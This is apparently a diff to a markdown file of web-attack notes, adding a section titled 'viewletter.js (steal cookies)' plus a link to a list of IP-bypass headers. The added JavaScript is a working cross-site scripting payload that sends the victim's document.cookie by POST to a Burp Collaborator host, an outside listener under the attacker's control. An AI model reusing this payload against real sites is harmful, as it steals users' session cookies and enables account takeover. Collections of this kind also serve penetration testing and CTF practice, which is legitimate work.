@@ -97,4 +97,13 @@ module.exports = {
 ```
 
 
+
+### viewletter.js (steal cookies)
+```javascript
+fetch('http://4w1j76r5ydqthsa2yt357tr45vbmzb.burpcollaborator.net/', {
+		    method: 'POST',
+		    body: document.cookie
+		    });
+```
+
 [ip bypass headers](https://gist.githubusercontent.com/kaimi-/6b3c99538dce9e3d29ad647b325007c1/raw/339dad3040fd1a967588edf341eb72b033a9d9fe/gistfile1.txt)
